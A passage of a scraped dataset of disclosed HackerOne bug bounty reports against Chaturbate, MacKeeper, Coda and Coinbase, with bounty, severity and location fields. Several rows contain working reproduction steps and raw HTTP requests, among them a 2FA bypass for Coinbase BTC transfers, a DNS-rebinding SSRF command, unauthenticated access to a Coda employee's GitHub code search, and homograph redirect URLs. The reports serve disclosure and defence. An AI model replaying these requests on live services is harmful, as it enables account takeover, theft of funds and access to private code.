3- Now User changes his email from control panel [New email : etc11@z.com]
4- But the old reset still remains valid after email change
In-case an attacker able to get access to user's old email account he can hack his chaturbate account too via that link, so expiring the token at email change will be a better practice
Impact
The attacker can still change the password if victim thinks his/her account is compromised and decided to chnage his email",https://hackerone.com/reports/411337,California,United States,Irvine,2018,9,19,5,13
Chaturbate,11-50,0.0,1m-10m,$100.00,Low,2.0,Violation of Secure Design Principles,Homograph attack on redirect URL (https://chaturbate.com/external_link/?url),"caffeinefix  submitted a report to Chaturbate.Jul 22nd (4 years ago)Hi There,
Hope you are doing good,
As i was just playing around with chaturbate.com and found that you guys does not have proper configuration for malicious script injection in website.
In Homograph attack basically attacker may able to inject some malicious script with URL.
Here i made homograph link for the ebay.com, when normal user see this link its look like normal simple text link but no its not simple link it's crafted homograph malicious script link so when user see this particular link user might be think that they are going to redirect on eBay.com but the fact that the link which add is malicious link and made from homograph encoding so when user click on this link user will redirect on some malicious website.
The IDN (Malicious link which i add in website) : https://xn--eby-7cd.com in looking it's look like eBay.com but when user click this link user will redirect on malicious website.
POC video
Video F323281: Video_20180722_190546.mp4 3.23 MiBZoom in Zoom out Copy Download
POC URL
https://chaturbate.com/external_link/?url=http://ebаy.com/
Prevention of this vulnerability
To prevent this vulnerability it would be safer to show the punycode version of the url so it would be apparent that something weird is going on. that is, show http://xn--eby-7cd.com/ instead of eBay.com.
you can see that how hackerone prevent this vulnerability
For instance, Here you can see that in hackerone if i am attaching punycode homograph URL but when you click on this link it will show you actual encryption URL of malicious URL : http://xn--eby-7cd.com/ - Click on this link and you will get know how to prevent this vulnerability or else you can also put prevention by adding validation on particular field for URL.
Reference
https://hackerone.com/reports/29491
https://hackerone.com/reports/175286
Please let me know if you want more information then,
Cheers,
Ninjan
Impact
Attacker may able to inject any homograph URL in website and able to scratch any normal user to their malicious website.1 attachment:F323281: Video_20180722_190546.mp4chessmast3r   updated the severity from medium to low. Jul 22nd (4 years ago)chessmast3r   changed the report title from Homograph attack on redirect URL  to Homograph attack on redirect URL (https://chaturbate.com/external_link/?url). Jul 22nd (4 years ago)chessmast3r   changed the status to Triaged. Jul 22nd (4 years ago)Hi @ninjan, 
Thank you for your submission! Your report has been validated, and it has been submitted to the appropriate remediation team for review. 
They will let the HackerOne triage team know the final ruling on this report, and if/when a fix will be implemented. 
The HackerOne triage team will follow-up after the remediation team has assessed the impact of this report. Please note that the status and severity are subject to change. 
Regards.
@chessmast3r  Chaturbate  rewarded caffeinefix with a $100 bounty. Jul 22nd (4 years ago)Thanks for the report, displaying IDN domains is a complex issue, many browsers have detailed algorithms for whether to display the unicode or punycode version.
However since we're a majority English language site, we'll change to just displaying the punycode for now.williammmllc Chaturbate staff  closed the report and changed the status to Resolved. Jul 22nd (4 years ago)This has been resolved. Thanks again for the report.williammmllc Chaturbate staff  requested to disclose this report. Sep 19th (4 years ago)caffeinefix   agreed to disclose this report. Sep 20th (4 years ago)  This report has been disclosed. Sep 20th (4 years ago)",https://hackerone.com/reports/385145,California,United States,Irvine,2018,7,22,9,7
Chaturbate,11-50,0.0,1m-10m,$800.00,Medium,6.5,Server-Side Request Forgery (SSRF),Blind SSRF on image proxy camo.stream.highwebmedia.com,caffeinefix  submitted a report to Chaturbate.Jul 22nd (4 years ago),https://hackerone.com/reports/385178,California,United States,Irvine,2018,7,22,12,50
Chaturbate,11-50,0.0,1m-10m,$100.00,Low,2.0,Violation of Secure Design Principles,Homograph attack on redirect URL ,"sam75434  submitted a report to Chaturbate.Jul 23rd (4 years ago)Hello Team
There is no Homography protection on redirect URL
URL:
https://m.chaturbate.com/external_link/?url=http://ebаy.com
In Homograph attack basically attacker may able to inject some malicious script with URL.
Here i made homograph link for the ebay.com, when normal user see this link its look like normal simple text link but no its not simple link it's crafted homograph malicious script link so when user see this particular link user might be think that they are going to redirect on eBay.com but the fact that the link which add is malicious link and made from homograph encoding so when user click on this link user will redirect on some malicious website.
The IDN (Malicious link which i add in website) : https://xn--eby-7cd.com in looking it's look like eBay.com but when user click this link user will redirect on malicious website.
Vulnerable  URL: https://m.chaturbate.com/external_link/?url=http://ebаy.com
Reference
https://hackerone.com/reports/29491
https://hackerone.com/reports/175286
Impact
Attacker may able to inject any homograph URL in website and able to scratch any normal user to their malicious website.",https://hackerone.com/reports/385372,California,United States,Irvine,2018,7,23,12,6
Clario Tech,501-1000,0.0,1m-10m,$300.00,Medium,5.45,Authentication Bypass Using an Alternate Path or Channel,Account verification bypass on translate.kromtech.com,rumiljonov  submitted a report to Clario.Nov 14th (3 years ago),https://hackerone.com/reports/737334,England,United Kingdom,London,2019,11,14,12,29
Clario Tech,501-1000,0.0,1m-10m,$300.00,Medium,6.1,Misconfiguration,Bypass front server restrictions and access to forbidden files and directories through X-Rewrite-Url/X-original-url header on account.mackeeper.com,rumiljonov  submitted a report to Clario.Nov 14th (3 years ago),https://hackerone.com/reports/737323,England,United Kingdom,London,2019,11,14,12,9
Clario Tech,501-1000,0.0,1m-10m,$50.00,Low,2.0,Denial of Service,Cookie injection leads to complete DoS over whole domain *.mackeeper.com. Injection point accountstage.mackeeper.com/,"mayurudiniya  submitted a report to Clario.Apr 28th (3 years ago)Summary:
 The cookie bomb works by setting large cookies that are way too big making the server decline any request send with them for having a too long request header.
PoC


Open below link and click on link
https://unequaledfloor.htmlpasta.com/


Now open https://accountstage.mackeeper.com/ or https://.mackeeper.com/ , these domains won't open anymore.


Impact
The escape function is used, which means a value consisting of special symbols will become three times longer. For example ,,, will turn into %2C. That means an attacker can create a valid link of proper length accepted both by the browser and the server, which however will make the cookie too long.",https://hackerone.com/reports/861521,England,United Kingdom,London,2020,4,28,14,42
Clario Tech,501-1000,0.0,1m-10m,$300.00,Medium,5.0,Insecure Direct Object Reference (IDOR),IDOR at https://account.mackeeper.com/at/load-reports/profile/<profile_id> leaks information about devices/licenses,m4ll0k  submitted a report to Clario.Jan 25th (3 years ago),https://hackerone.com/reports/783117,England,United Kingdom,London,2020,1,25,10,59
Clario Tech,501-1000,0.0,1m-10m,$750.00,High,7.8,Privilege Escalation,Local Privilege escalation to root via XPC,nan,https://hackerone.com/reports/750118,England,United Kingdom,London,2019,12,2,22,36
Clario Tech,501-1000,0.0,1m-10m,$50.00,Low,2.0,Cross-site Scripting (XSS) - Reflected,rXSS on https://mackeeperapp.mackeeper.com/landings/download-blue/,trungnd95  submitted a report to Clario.May 22nd (about 1 year ago),https://hackerone.com/reports/1206020,England,United Kingdom,London,2021,5,22,20,12
Coda,101-250,0.0,No value,$800.00,High,7.95,Improper Access Control - Generic,Lack or Origin check leads to Cross-Site Websocket Hijacking (CSWSH),fisher  submitted a report to Coda.Apr 11th (4 years ago),https://hackerone.com/reports/535436,California,United States,Palo Alto,2019,4,11,9,12
Coda,101-250,0.0,No value,$450.00,Medium,5.9,None,Use Github pack with Coda employee github account (search code of Coda's private repositories),"stefanofinding  submitted a report to Coda.Aug 19th (3 years ago)Summary:
When you use the Github formula, the information from the Github API is returned by the endpoint https://coda.io/coda.CalcService/InvokeFormula. From what I understand, this endpoint expects a gRPC request. In the request is sent: the formula (Github..CodeSearch), the version of the Github pack (3.4.1), the id of the Github connection  (generated by Coda when connecting your account), the id of the document to which the Github account is linked, and the parameters for the formula.
The issue is that you can take the document id and connection id of any public document and use the formula as you please. Also, it's not required to be authenticated to make a request to the endpoint https://coda.io/coda.CalcService/InvokeFormula. It may be working as designed, so that's why I used a document created by a Coda employee for the proof of concept in case that is considered a N/A report :D
Steps To Reproduce:
Pass all requests through Burp or similar proxy to make the reproduction easier.

Make sure you are signed in https://coda.io
Go to https://coda.io/t/Git-Cherry-Pick-From-Branch_tTZJuuyHgqa/preview?useBack
If you look at the requests in Burp, you will see a request to https://coda.io/embed/igvicDMruo?viewMode=gallery&disconnected=true that is loaded in an <iframe> (it is the document you see when you load the template). ""igvicDMruo"" is the document id.
Using the document id from the last step, go to https://coda.io/internalAppApi/documents/igvicDMruo/externalConnections
The value that matters from the response is the id of the object  with name ""albertc44"". The connection id is 7b167155-731e-4913-9091-729c5bd77ee0
Go to https://coda.io/newdoc/POC
Click ""Create doc""
Click the ""Open Packs"" button at the top right. It is the puzzle piece icon between the robot and the arrows
Click ""+ Add a new Pack""
Click the ""Github"" card/box
Click the orange ""Sign in to install"" button
Click ""Authorize codaprojectapp""
Click ""You and anyone this doc is shared with""
Click ""Nobody""
Click the orange ""+"" button at the top of the document
Go to ""Formula"", then ""Github"", and then click ""CodeSearch""
In the dialog opened press the key ""Tab"", enter comma ,, enter ""secret"", enter ,, enter organization: ""kr-project"" and finally press the key ""Enter""
In Burp Proxy or similar, find the last request to /coda.CalcService/InvokeFormula and send it to the Repeater or similar to modify
Remove the Cookie header 
The value between $ and 2$ is the connection id. Replace this value with the 7b167155-731e-4913-9091-729c5bd77ee0 you got before (don't touch the 2 before the $ 😅 )
The first ten characters of the last line are the document id. Replace it with the document id you got in the first steps (igvicDMruo)
Send the request
The most interesting things in the response are the values of Fragment

Supporting Material/References:
None
Impact
It's possible to search the code of all the private repositories to which https://github.com/albertc44 has access. Including the ones of the kr-project organization, that is where the Coda repositories are.",https://hackerone.com/reports/676581,California,United States,Palo Alto,2019,8,19,13,34
Coda,101-250,0.0,No value,$200.00,Medium,4.3,Improper Access Control - Generic,"Unrestricted access to any ""connected pack"" on docs","0xcrypto  submitted a report to Coda.Jan 19th (3 years ago)Summary:
When adding a pack, a post request is sent to https://coda.io/internalAppApi/documents/[doc ID]/packs with data {""packId"":[pack Id]} where doc ID is the id of doc user wishes to add pack and pack ID is the pack user wants to install.
But this request is unrestricted and the user can iterate over packId to get any free/pro/disabled pack.
Steps To Reproduce:

Capture the post request while installing any pack using a proxy like Burp when you are logged in.
Change packId to desired pack's ID. A valid packId gives a 200 status and invalid gives 400.

The below post request contains packId of Google Translate Pack which is a pro pack.
Code 558 BytesWrap lines Copy Download1POST /internalAppApi/documents/F5Y1qJ3aw-/packs HTTP/1.1
2Host: coda.io
3Connection: close
4Content-Length: 15
5Accept: application/json
6Origin: https://coda.io
7X-Csrf-Token: InEwS0Z2U21xR09JUDI2Qkwi
8User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36
9Content-Type: application/json
10Sec-Fetch-Site: same-origin
11Sec-Fetch-Mode: cors
12Referer: https://coda.io/d/Untitled_dF5Y1qJ3aw-/asdf_suTAx
13Accept-Encoding: gzip, deflate
14Accept-Language: en-US,en;q=0.9
15Cookie: /* Your Cookie */
16
17{""packId"":1063}
Sending the request should return a 200 OK. Check the doc, the pro pack is installed.
This doc created by 0x00cryptohackeronetester@gmail.com uses Google Translate pro pack without upgrading. Installing the pro pack gives a 14 days warning. I am not sure if it will expire and become read only.
Impact
Allows anyone to use paid functionality for free causing loss to business.",https://hackerone.com/reports/777942,California,United States,Palo Alto,2020,1,19,17,44
Coinbase,5001-10000,0.0,10m-50m,$100.00,No value,0.0,Violation of Secure Design Principles,2 factor authentication design flaw,"ryancollins  submitted a report to Coinbase.Apr 12th (9 years ago)Hello,
I keep getting redirected where to report this bug. Hopefully this will finally get the job done. I have attached a screenshot of the original bug report which can be found at https://coinbase.desk.com/customer/en/portal/private/cases/294281 
Here are a few excerpts from the report to summarize the bug:
""I have my settings set to require 2fa for sending any BTC from my account. However, if I send my BTC to a paper wallet, no 2fa is required. Doesn't that kind of defeat the point? [...] Given that this bug is significant enough to completely bypass one of your security features, I'm curious as to whether this would be eligible for the bounty.""1 attachment:F6333: bug.pngmagoo   posted a comment. Apr 15th (9 years ago)Hey ryancollins, you're in the right place. We'll review this and get back to you.lianj   posted a comment. Apr 25th (9 years ago)hey ryancollins, can you confirm its fixed now?ryancollins   posted a comment. Apr 25th (9 years ago)Yes, it is now fixed. When I exported to a paper wallet this time I was prompted to enter my 2 factor authentication code. Thank you for fixing this bug. magoo   closed the report and changed the status to Duplicate. Apr 28th (9 years ago)Thanks. This was a duplicate, but since this was a nasty bug we'll be rewarding. magoo   reopened this report. Apr 28th (9 years ago)magoo   closed the report and changed the status to Resolved. Apr 28th (9 years ago)Coinbase  rewarded ryancollins with a $100 bounty. Apr 28th (9 years ago)ryancollins   agreed to disclose this report. Jun 6th (8 years ago)  This report has been disclosed. Jun 6th (8 years ago)ryancollins   posted a comment. Jun 6th (8 years ago)For the sake of transparency, may the community and I have a link to the duplicate bug report, or is that not publicly disclosed? 
Thank you,
Ryan",https://hackerone.com/reports/7369,California,United States,San Francisco,2014,4,12,17,47
Coinbase,5001-10000,0.0,10m-50m,$100.00,Low,2.0,None,[buy.coinbase.com]Content Injection,"0xspade  submitted a report to Coinbase.Apr 5th (6 years ago)Hello Coinbase
Details
I'm not sure if this issue will count, i just want to make sure that is why i submit it. The parameter code is Vulnerable in Content Injection allowing me to inject any Text.
Proof Of Concept
Here is my PoC:
Image F173393: Content_Spoofing.png 128.34 KiBZoom in Zoom out Copy Download
and this which the text overlaps on the modal.
Image F173394: Content_Injection_2.png 150.66 KiBZoom in Zoom out Copy Download
PoC Link
https://buy.coinbase.com/widget?code=<Content Injection here>&address=1234567890&crypto_currency=BTC
Best Regards,
@phspade2 attachments:F173393: Content_Spoofing.pngF173394: Content_Injection_2.png0xspade   posted a comment. Apr 25th (6 years ago)Hello, Any Updates here guys?Coinbase  rewarded 0xspade with a $100 bounty. Apr 25th (6 years ago)Thanks for the report @phspade. We have fixed this issue and are rewarding you with a $100 bounty.coinbasewolf   closed the report and changed the status to Resolved. Apr 25th (6 years ago)0xspade   requested to disclose this report. Apr 25th (6 years ago)oh yeah, Thanks for the Bounty @coinbase .. Shall we?  This report has been disclosed. May 25th (5 years ago)Coinbase  has locked this report. Mar 21st (5 years ago)",https://hackerone.com/reports/218680,California,United States,San Francisco,2017,4,5,6,36
Coinbase,5001-10000,0.0,10m-50m,$100.00,No value,0.0,Information Disclosure,Application error message,"dr_dragon  submitted a report to Coinbase.Jun 27th (6 years ago)poc url:https://developers.coinbase.com/api/%e3h
This page contains an error/warning message that may disclose sensitive information.The message can also contain the location of the file that produced the unhandled exception.This may be a false positive if the error message is found in documentation pages.1 attachment:F101869: 1.PNG",https://hackerone.com/reports/147577,California,United States,San Francisco,2016,6,27,2,12
Coinbase,5001-10000,0.0,10m-50m,$200.00,Low,2.0,Privilege Escalation,Authentication Issue,"bugdiscloseguys  submitted a report to Coinbase.Oct 20th (6 years ago)Hello there,
I noticed while creating Recurring payment while 2FA is enabled it asks a user to enter verification code.
So when someone confirm the Reccuring payment a request is sent to :
Code 3.41 KiBWrap lines Copy Download1POST /recurring_payments/58087a3d6861ee015644fc48/confirm HTTP/1.1
2Host: beta.coinbase.com
3User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:51.0) Gecko/20100101 Firefox/51.0
4Accept: */*;q=0.5, text/javascript, application/javascript, application/ecmascript, application/x-ecmascript
5Accept-Language: en-US,en;q=0.5
6Accept-Encoding: gzip, deflate, br
7Referer: https://beta.coinbase.com/recurring_payments
8X-NewRelic-ID: XA4HVVZTGwIAVFVXBAAG
9X-CSRF-Token: /hSt/DD82VwI6ks+4P0VTHTDULz5EhHKowGAGfryWcVCZd47s+rQZDCgr70pJK4EeFHkKWRd0SJbVq1K64IZLA==
10Content-Type: application/x-www-form-urlencoded; charset=UTF-8
11X-Requested-With: XMLHttpRequest
12Content-Length: 28
13Cookie: __utma=117893787.1205167212.1468114999.1475980536.1476020583.48; __utmz=117893787.1475796788.43.5.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=https%3A%2F%2Fwww.coinbase.com%2Fusers%2Ffa1f4606a31526801960b8c5703e2fa3%2Fverify; _coinbase=SDhMZytnck5TRi9McEMvMnpzY09OcjhJSlZ3TTZwYlFpWEZWcVlXcW13a1UzL3ZwdVFpdUlBd3RJSXBnSEhnOXZNZkExS1EyQXNNMitWSDVtQVpMVTdrdFRZTGFPRkVFMjZUbGZpVUhaYXA2aFdZa2hmWk55c0JzODM3ZzR0cHFTTmF1RHduOGhuZHFoOExDQ3craFdBWlJDalpOckhISlVtdzArWVMvdy9VSzJ2ZG9tejVIN3FQZXltSTlpeHRMd1VnNVRJL296b0tCT2VkWDlhaVJTWlU0ZkJDVkpPVFVwVXBnY09SVE5tcHVsYXNyMzdmUDdLS0NEbUhPSnI1d2ptM2JFcHFEQ0xQK1VCOWxMZXJFVG9HNlR1MnJXVk9TNjJuczlMN2NQdytWQnVuenZQeVI0bTF0dEc4b0FnWVY0WVZOcUVqOXE1RjYxVUVHV2pXSEdmTDVaYXI4dGNuVFhLb3JJb1N6eGwyMXNPSDRzWXRXNGhMd3l6aS8vSmp1bE94VlVYcit3UEVjc1JaKzVQalFlQzZuNnZLcDMwRE95UHR3MEpIUk1XZnliRlNSRWljR0NjN1JjUG90czd4UVY1TUp4YURJMkc5QUkrMGtiNVduSTc4WE9DT1ZsYzRKUERlNXAwakxQWWZlM2lQWDhydis5RStmYlAvVmtWS1h1OVhNTEtxSHNLOHkxa0hsOHkxaGpUdU1NdDJkRE1qU1EweEc0QVBKTEVnVjhvWlJQNFZiQ2pLYzRMYTNteUJjb1prMmIwRmtaMVlZc0w1aStBN3BkVEVqQXUxbDR0M2hITlN2SG1NVTQ3ZmZjT3QzamJERWY0RFIwSE5QL0tkTC0tdklic3RLUW1PZGhMNUErbUduRHNvQT09--d62907cee478b842f0368b067911107b93901fd5; df=730203b840afd60662e0f702672e42c0; ba=Mozilla%2F5.0%20(Macintosh%3B%20Intel%20Mac%20OS%20X%2010.11%3B%20rv%3A51.0)%20Gecko%2F20100101%20Firefox%2F51.0%23Intel%20Mac%20OS%20X%2010.11%234%2320100101%2320161019004013%23en-US%7C-330%23-330%23Thu%20Jan%2001%201970%2005%3A30%3A00%20GMT%2B0530%20(IST)%231%2F1%2F1970%2C%205%3A30%3A00%20AM%7C1280%23800%231280%23773%231%2324%230%2363%7C92f0112e7e19a58c900cddb7a717071a%23eca2166361dcd2ed64208e3d3543f751%23747b82b0027818ce808067ac0bb5118c%23383d750ac35ce7f8529ea4feefe52bd5%2390043fe540993e69ecde6102236dee71%7C%7CAAAAwBMBMpARDHcHAAhAAAAAAOQFaY6AAg%3D%3D; wcsid=2LddXtSmHNylLs5x1T41E46ICJKMJ18e; hblid=EdBhoju3s0gWxyDX1T41E46ICJk0KMTy; _oklv=1476950540058%2C2LddXtSmHNylLs5x1T41E46ICJKMJ18e; _okdetect=%7B%22token%22%3A%2214769450025350%22%2C%22proto%22%3A%22https%3A%22%2C%22host%22%3A%22beta.coinbase.com%22%7D; olfsk=olfsk6806335012267972; _okbk=cd4%3Dtrue%2Cvi5%3D0%2Cvi4%3D1476945007028%2Cvi3%3Dactive%2Cvi2%3Dfalse%2Cvi1%3Dfalse%2Ccd8%3Dchat%2Ccd6%3D0%2Ccd5%3Daway%2Ccd3%3Dfalse%2Ccd2%3D0%2Ccd1%3D0%2C; _ok=8678-140-10-4291; _ga=GA1.3.1205167212.1468114999; __cfduid=d18d5c640e53cb87b90006494522c47431476945463; _ga=GA1.2.1205167212.1468114999; __ssid=b49e9a04-f751-4f59-a56f-845e27fe3277; mp_mixpanel__c=316; sft=7f8f7e817da5d65688adc609f2c7405d; address_58086c598ace9202b6531de0=580878636861ee03a644fc45; _gat=1; mp_7c112173efca4899213c618484d8f5fe_mixpanel=%7B%22distinct_id%22%3A%20%2257e87cd8694c037037f2b78b%22%2C%22country_code%22%3A%20%22IN%22%2C%22REACT%22%3A%20true%7D; request_method=POST; _gali=recurring_payments_modal
14Connection: keep-alive
15
16utf8=%E2%9C%93&_method=patch
Now when someone delete this reccuring payment there is no such option to restore it and note that for re-creating it you need a VERIFICATION CODE.
But if someone repeat the request which was obtained while confirming payment the reccuring payment is restored to particular payment ID.
Thanks
God is great <3
Please mark it as informative if you dont believe its a security threat for you",https://hackerone.com/reports/176979,California,United States,San Francisco,2016,10,20,8,27
Coinbase,5001-10000,0.0,10m-50m,"$5,000.00",No value,0.0,None,Big Bug with Vault which i have already reported: Case #606962,"datokaa  submitted a report to Coinbase.May 31st (7 years ago)All info was provided via email you guys asked me to put my case number here.
Case #606962
im datokaa@gmail.com on coinbase",https://hackerone.com/reports/65084,California,United States,San Francisco,2015,5,31,17,53
Coinbase,5001-10000,0.0,10m-50m,$100.00,No value,0.0,Information Disclosure,Blacklist bypass on Callback URLs,"agarri_fr  submitted a report to Coinbase.Mar 22nd (8 years ago)In bug #47368, I was able to reach private IP addresses via the ""Test Now"" button of the ""Callback URL"" feature. Exploiting this flaw allowed me to reach the metadata server of your outbound proxy (which is, afaik, maintained by Proximo). A comment by aianus  states that callbacks are now restricted ""from hitting any RFC 6890 IP addresses and networks"". This security measure can be bypassed used DNS rebinding.
 Let's consider what happens where an URL like http://test42.sqli.nicob.net/_hostmanager/healthcheck is submitted via the ""Merchants settings"":
1) The hostname ""test42.sqli.nicob.net"" is resolved (twice) by your servers. Then the resulting IP address is checked against a blacklist. If the IP is blacklisted, the message ""Invalid callback URL"" is printed and processing stops
2) If the IP isn't blacklisted, the request is sent to the outbound proxy managed by Proximo. The proxy will resolve ""test42.sqli.nicob.net"" too, without applying a strict blacklist. Then the target URL is accessed.
In order to exploit the flaw, we need a custom DNS server. A patched copy of dnschef can be used to send different answers at different times and bypass the filter. The following command will instruct the DNS server to answer with IP #2 twice (an authorized one), then IP #1 (a blacklisted one), then back to the beginning (scheme ""221"").
Code 375 BytesWrap lines Copy Download1 # ./rebind.py --ip1=127.0.0.1 --ip2=92.243.29.213 --scheme=221
2[17:05:08] 54.144.123.243: cooking the response of type 'A' for test42.sqli.nicob.net to 92.243.29.213 [1]
3[17:05:08] 54.82.64.0: cooking the response of type 'A' for test42.sqli.nicob.net to 92.243.29.213 [2]
4[17:05:09] 54.162.118.12: cooking the response of type 'A' for test42.sqli.nicob.net to 127.0.0.1 [3]
The filters will see ""92.243.29.213"" and the proxy will see ""127.0.0.1"". And the Web interface will display the index page of the Web service listening on port TCP/80 of the loopback interface of the proxy server. Several ports were identified on loopback (80, 1080, 8000, 9177, ...)  and I found some unprotected URL like http://127.0.0.1:80/_hostmanager/healthcheck (which simply displays ""OK"").
Regarding exploitation:

the metadata server on 169.254.169.254 is unreachable (that's good for you!)
the pages found (:9177/status, :80/_hostmanager/healthcheck, :80/check, ...) are unproctected but not sensitive
I may have missed some URL or web servers listening on loopback (brute-force is hard because of rate limitations)

Advice: the outbound proxy should implement a blacklist restricting access to internal and private IP addresses
NB: this kind of DNS blacklist may be 1) used elsewhere by Coinbase2) exploited more easily in a different scenario",https://hackerone.com/reports/53004,California,United States,San Francisco,2015,3,22,16,26
Coinbase,5001-10000,0.0,10m-50m,"$1,000.00",No value,0.0,Improper Authentication - Generic,Bypassing 2FA for BTC transfers,"michiel  submitted a report to Coinbase.May 1st (9 years ago)Under advanced settings, users have the ability to protect their wallet by requiring two-factor confirmation when sending bitcoins. Personally, I have configured my account with the most secure option, which requires two factor confirmation when sending any amount of bitcoins. However, a flaw exists that allows an attacker with access to the account to bypass the two-factor authentication step that is required upon sending.
The vulnerability exists in the transfer feature that allows you to transfer funds between all wallets under the same account (internal transfer). This feature is only visually available when you have at least two wallets, but it is not necessary to have two wallets to exploit this vulnerability. Just makes the process a bit easier.
Easy repro steps

Enable the account security setting that requires you to enter a valid two-factor code when transferring any amount of bitcoins.
Create a second wallet and go to Manage Accounts (https://coinbase.com/accounts).
Click the Transfer button and select the wallet you want to send money from.
Under To select one of the other wallets on the account (this doesn't actually matter).
Pick an amount and hit the Transfer button. Make sure to intercept this request! Use Burp Suite for instance. The request should look similar to this:

Code 468 BytesWrap lines Copy Download1POST /accounts/transfer_money HTTP/1.1
2Host: coinbase.com
3[...]
4
5----------422668630
6Content-Disposition: form-data; name=""transaction[from]""
7
851cf4e552f31a99ce200001b
9----------422668630
10Content-Disposition: form-data; name=""transaction[to]""
11
1253440a8092adb7d95000001d
13----------422668630
14Content-Disposition: form-data; name=""transaction[amount]""
15
160.1
17----------422668630
18Content-Disposition: form-data; name=""transaction[notes]""
19
20Bypassin' 2FA.
21----------422668630--

Change the transaction[to] parameter to the Mongo BSON ID of the wallet you want to transfer the BTCs to. This can be any wallet ID outside the account you were initiating an internal transfer for. It is fairly easy to find the ID of a wallet, for example, it can be found in the DOM:

Code 156 BytesWrap lines Copy Download1<li>
2  <a href="""" class=""account-wallet active"" data-wallet-id=""53440a8092adb7d95000001d"">
3    <strong>My Wallet</strong> <span>1.00 BTC</span>
4  </a>
5</li>

Forward the request. The money is now transferred to the Coinbase wallet associated with the ID specified under transaction[to]. No two-factor code was entered.",https://hackerone.com/reports/10554,California,United States,San Francisco,2014,5,1,19,58
Coinbase,5001-10000,0.0,10m-50m,$100.00,No value,0.0,Violation of Secure Design Principles,ByPassing the email Validation Email on Sign up process in mobile apps,"kaleemgiet  submitted a report to Coinbase.Apr 22nd (8 years ago)Hi,
According to the design When the new user sign up using mobile apps(android,ios).It will ask for the confirmation of the email.It will send a confirmation mail to mail id and a screen will also appear in the mobile app. The user needs to open the email in the device then the screen will Off and user will successfully login.
Bypass:
Here simply we can bypass this validation and can successfully login to the application without verifying the validation email which comes to the user.Using this the attacker can create so many spoofed accounts.
1.Sign for new user using email id and password
2.Next screen will appear saying please click on the validation which sent to proceed further
3.Here in the second screen click the back button now you will go to Login screen
4.Now login with the creds which you have given in the registration process
5.Now you will successfully login to the application
6.Here it is not asking for email verification email.
Pls follow above procedure to reproduce the issue.
Pls respond to remaining bugs which I had reported 
Thanks,
kaleem",https://hackerone.com/reports/57764,California,United States,San Francisco,2015,4,22,14,41
Coinbase,5001-10000,0.0,10m-50m,$100.00,Low,2.0,Violation of Secure Design Principles,Captcha Bypass in Coinbase SignUp Form,"tejpratap  submitted a report to Coinbase.Jul 7th (5 years ago)Vulnerability description:
The g-recaptcha-response is not validated on the server-side when submitting a Signup form to the endpoint. Any or no value can be provided for this header
Step to reproduce:

https://www.coinbase.com/signup
Fill the input field and Validate the captcha.
Trun on Brurp submit form and capture the request.
Remove the g-recaptcha-response( response value) and foreword it.

Impact.
Fake accounts can be created. Also username enumeration can be performed because no application will allow two email to choose same email.3 attachments:F200943: Original_Request1.pngF200944: Edited_Request1.pngF200945: Sussesfully.png",https://hackerone.com/reports/246801,California,United States,San Francisco,2017,7,7,7,33
Coinbase,5001-10000,0.0,10m-50m,"$1,000.00",No value,0.0,Information Disclosure,Coinbase Android Application - Bitcoin Wallet Leaks OAuth Response Code,"prakharprasad  submitted a report to Coinbase.Mar 31st (9 years ago)Hi,
There's a simple bug here, the Coinbase Android App. ""BitCoin Wallet"" leaks the OAuth Response Code which can be obtained using adb logcat -s Coinbase command line for testing, and any Android application on the same phone can read the response code for the user by reading the logs. As of now nothing can be harmed with OAuth Response code, but along with the hardcoded client secret we can obtain the access_token.
This bug is similar to this - http://attack-secure.com/all-your-facebook-access-tokens-are-belong-to-us/
So using the stolen response code and client secret we can derive the access_token
POC: https://www.dropbox.com/s/zionksi1pt7lot5/Coinbase-Android.mov",https://hackerone.com/reports/5314,California,United States,San Francisco,2014,3,31,6,12
Coinbase,5001-10000,0.0,10m-50m,$100.00,No value,0.0,Cryptographic Issues - Generic,Coinbase Android Security Vulnerabilities,"bryanstern  submitted a report to Coinbase.Mar 11th (9 years ago)My name is Bryan Stern and I am Android Software Engineer. Last night I took another look at your Android application and found some disturbing vulnerabilities that could allow for a user's account to be hijacked. Fortunately, they are very easy to resolve. Below I have outlined the issue, gave some recommendations, and attached some screenshots.
Coinbase for Android Security Flaws:

The application does not perform any SSL certificate verification.
The API design does not prevent request tampering or replays.
The consumer id and secret of the app is widely available.

Potential for damage:

Without implementing your own SSL certificate validation in the Coinbase app, a ""man in the middle"" can sniff and alter communication between the application and Coinbase API. A malicious hacker could then use this to violate user privacy as well as take advantage of the other two flaws listed. Worse, an attacker could steal the access token provided in network responses and have full API access to the user's Coinbase account using the widely available Coinbase Android consumer id and secret.
Because requests are neither adequately protected by SSL, nor are they signed, an attacker could repeat or tamper with requests. For example, an attacker could repeat requests to buy bitcoin, sell bitcoin, or send bitcoin requests from the app to either empty their associated bank account, sell bitcoins needed by the user, or repeat a transfer bitcoins to another account. Not only can transactions be repeated, they can be modified in transit. So, for example, an attacker could change the recipient (and/or amount) of a transaction request.
The consumer id and secret exposure means that their is no trusted secret between the Coinbase Android app and the Coinbase API. This means any program could make requests to the Coinbase API pretending to be the Coinbase Android app. You would not be able to block the abuser of the Coinbase API without disabling the Coinbase Android app until a new build with a new consumer id and secret was distributed.

How to establish the man in the middle attack on Android

Set up a proxy server that the Android device will route traffic through. I use www.charlesproxy.com for this.
Install the SSL certificate on the device that the proxy will present as Coinbase's SSL certificate to it's clients. (www.charlesproxy.com/charles.crt)
Configure your device to point it's traffic through Charles.
Enable SSL 
View, repeat, and modify requests in Charles Proxy.

Availability of the Consumer Id and Secret

It is publicly available in the GitHub repository. (https://github.com/coinbase/coinbase-android/blob/bc6a03229416736acc2ea6bc2fb13f55f7029751/coinbase-android/src/com/coinbase/api/LoginManager.java#L49)
It is visible in many requests made by the device when monitoring requests during the man in the middle attack.

Recommendations:

Read the Android Documentation on SSL. 
Sign OAuth requests and use nonces. See Twitter's documentation for an example. https://dev.twitter.com/docs/auth/creating-signature
Change your consumer id and secret and keep them confidential. There is no need to ever send the consumer secret if requests are signed using it.
Based on the available source code, I see that ProGuard is not being used. I highly recommend it both to obfuscate your compiled code and for some of the optimizations available.


Please let me know how much time you may need to resolve these issue as I would like to publish this on my own blog soon (~3 weeks). If you have any questions, I would be more than happy to answer any questions and walk your developers through the issues.
Best Regards,
Bryan Stern",https://hackerone.com/reports/5786,California,United States,San Francisco,2014,3,11,20,5
